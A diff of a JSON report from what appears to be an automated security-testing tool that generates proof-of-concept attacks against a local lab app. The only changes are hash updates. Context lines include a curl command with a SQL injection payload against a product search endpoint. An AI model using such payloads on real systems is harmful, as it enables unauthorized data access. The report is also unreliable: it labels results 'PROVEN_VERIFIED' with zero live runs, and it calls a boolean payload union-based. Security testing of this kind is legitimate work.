@@ -9,7 +9,7 @@
     "synthesis_duration_ms": 12.5,
     "total_pocs_synthesized": 6
   },
-  "canonical_payload_sha256": "fbd093f33459c3b6625ceed7edec90df237ce39f4194f1d2df7823d4cc386fe7",
+  "canonical_payload_sha256": "29bce1d69776edb9cea417d6eb2d6ca33f02c8a36dc77cba01903be7306c35b6",
   "conclusive_status": "PROVEN_VERIFIED",
   "execution_classification": {
     "actual_live_lab_runs": 0,
@@ -30,7 +30,7 @@
     {
       "category": "SQLI",
       "curl_command": "# NOTICE: Explicit target authorization and scope validation required before execution.\ncurl -sS -i --proto =http,https --max-time 10 -H 'Accept: application/json, text/html, */*' 'http://127.0.0.1:3000/rest/products/search?q=%27+OR+1%3D1--'",
-      "deterministic_hash": "d5b4cdd8d7740f3c562200eea3e422a150a49685608d816b619e9c4153e09c4a",
+      "deterministic_hash": "822ecd57f03d0efff3f58d774471929e93c1c4b02fe2072b0e06463a2359dccd",
       "poc_id": "POC-SQLI-LAB-REAL-SQLI-003",
       "status": "VALIDATED_STATIC",
       "title": "Deterministic PoC: Union-Based SQL Injection on Product Search"
@@ -45,7 +45,7 @@
     },
     {
       "category": "MULTI_HOP_BREACH_CHAIN",
-      "deterministic_hash": "23d0c758d61b4e602c51b6120f3fe73e85e9a3aa57a37f3cbe84ba996db8f6f2",
+      "deterministic_hash": "58a40fa13d845f27b3c9dba54f284ae610164c6c123154a9c334e4ea3527d515",
       "hop_count": 2,
       "is_multi_hop": true,
       "poc_id": "POC-PATH-PATH-JUICE-CHAIN",
